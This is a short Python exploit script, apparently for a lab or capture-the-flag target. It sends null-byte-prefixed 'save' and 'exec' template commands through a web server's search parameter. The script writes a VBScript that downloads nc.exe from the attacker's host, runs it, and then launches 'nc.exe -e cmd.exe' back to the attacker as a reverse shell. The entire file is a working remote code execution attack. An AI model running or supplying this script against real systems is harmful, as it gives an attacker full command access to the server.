#!/bin/env python3

import urllib.request
import time
import sys


def exploit(rhost, rport, lhost, lport):
    vbs_payload_1 = f"C:\\Users\\Public\\script.vbs|dim%20xHttp%3A%20Set%20xHttp%20%3D%20createobject" \
                    f"(%22Microsoft.XMLHTTP%22)%0D%0Adim%20bStrm%3A%20Set%20bStrm%20%3D%20createobject" \
                    f"(%22Adodb.Stream%22)%0D%0AxHttp.Open%20%22GET%22%2C%20%22http%3A%2F%2F{lhost}%2Fnc.exe" \
                    f"%22%2C%20False%0D%0AxHttp.Send%0D%0A%0D%0Awith%20bStrm%0D%0A%20%20%20%20.type" \
                    f"%20%3D%201%20%27%2F%2Fbinary%0D%0A%20%20%20%20.open%0D%0A%20%20%20%20.write%20xHttp.responseBody" \
                    f"%0D%0A%20%20%20%20.savetofile%20%22C%3A%5CUsers%5CPublic%5Cnc.exe%22%2C%202%20%27%2F%2" \
                    f"Foverwrite%0D%0Aend%20with"
    vbs_payload_2 = "cscript.exe%20C%3A%5CUsers%5CPublic%5Cscript.vbs"
    vbs_payload_3 = f"C%3A%5CUsers%5CPublic%5Cnc.exe%20-e%20cmd.exe%20{lhost}%20{lport}"

    save_script = f"save|{vbs_payload_1}"
    exec_script = f"exec|{vbs_payload_2}"
    reverse_shell = f"exec|{vbs_payload_3}"

    url_1 = f"http://{rhost}:{rport}/?search=%00{{.+{save_script}.}}"
    url_2 = f"http://{rhost}:{rport}/?search=%00{{.+{exec_script}.}}"
    url_3 = f"http://{rhost}:{rport}/?search=%00{{.+{reverse_shell}.}}"

    if urllib.request.urlopen(url_1):
        print("[+] Script uploaded on target\n")
    time.sleep(3)
    if urllib.request.urlopen(url_2):
        print("[+] Script executed on target\n")
    time.sleep(3)
    if urllib.request.urlopen(url_3):
        print("[+] Started reverse-shell\n")
    time.sleep(3)


if len(sys.argv) != 5:
    print("Usage: ./6287.py [RHOST] [RPORT] [LHOST] [LPORT]\n")
    print("Example: ./6287.py 10.129.88.31 80 10.10.14.48 9001\n")
    sys.exit(1)
else:
    exploit(sys.argv[1], sys.argv[2], sys.argv[3], sys.argv[4])